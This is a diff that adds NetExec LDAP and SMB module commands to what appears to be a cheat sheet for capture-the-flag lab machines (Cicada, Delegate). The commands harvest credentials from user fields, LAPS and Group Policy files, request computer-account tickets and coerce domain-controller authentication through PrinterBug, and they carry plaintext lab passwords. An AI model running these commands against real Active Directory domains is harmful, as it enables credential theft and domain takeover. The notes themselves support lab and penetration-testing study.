@@ -255,6 +255,96 @@ LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                
 ./nxc ldap 10.10.11.35 -d cicada.htb --dns-server 10.10.11.35 -u 'CICADA\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --bloodhound
 ```
 
+### LDAP Modules Used in Delegate
+
+Each command uses the target and credentials from the Delegate notes.
+
+* `get-desc-users` - Lists user account `description` fields.
+
+```bash
+nxc ldap delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -t 1 -M get-desc-users
+```
+
+* `get-info-users` - Lists user account `info` fields, which can contain credentials.
+
+```bash
+nxc ldap delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -t 1 -M get-info-users
+```
+
+* `groupmembership` - Shows the groups to which `A.Briggs` belongs.
+
+```bash
+nxc ldap delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -t 1 -M groupmembership -o user='A.Briggs'
+```
+
+* `maq` - Reads the domain's MachineAccountQuota value.
+
+```bash
+nxc ldap delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -t 1 -M maq
+```
+
+* `daclread` - Reads access control entries on Active Directory objects.
+
+```bash
+nxc ldap delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -t 1 -M daclread
+```
+
+* `badsuccessor` - Checks for a Windows Server 2025 DC and OU permissions relevant to the dMSA BadSuccessor path.
+
+```bash
+nxc ldap delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -t 1 -M badsuccessor
+```
+
+* `adcs` - Finds AD CS enrollment services and certificate template names.
+
+```bash
+nxc ldap delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -t 1 -M adcs
+```
+
+* `laps` - Retrieves LAPS passwords readable by the authenticated account.
+
+```bash
+nxc ldap delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -t 1 -M laps
+```
+
+* `pre2k` - Finds pre-created computer accounts and attempts to obtain their TGTs.
+
+```bash
+nxc ldap delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -t 1 -M pre2k
+```
+
+* `get-network` - Queries Active Directory DNS records and their associated IP addresses.
+
+```bash
+nxc ldap delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -t 1 -M get-network
+```
+
+### SMB Modules Used in Delegate
+
+* `gpp_privileges` - Reads privileges assigned through GPOs and resolves their SIDs.
+
+```bash
+nxc smb delegate.vl -u '' -p '' -t 1 -M gpp_privileges
+```
+
+* `gpp_autologin` - Searches SYSVOL `Registry.xml` files for autologon credentials.
+
+```bash
+nxc smb delegate.vl -u '' -p '' -t 1 -M gpp_autologin
+```
+
+* `gpp_password` - Searches SYSVOL Group Policy Preferences XML for stored passwords.
+
+```bash
+nxc smb delegate.vl -u '' -p '' -t 1 -M gpp_password
+```
+
+* `coerce_plus` - Uses PrinterBug to coerce the DC to authenticate to `rbcd-test.delegate.vl`.
+
+```bash
+netexec smb delegate.vl -u 'rbcd-test$' -p 'Megaman!1' -M coerce_plus -o LISTENER=rbcd-test.delegate.vl METHOD=PrinterBug
+```
+
 ### Share Spidering
 
 Search share contents for keywords (e.g. passwords in files):
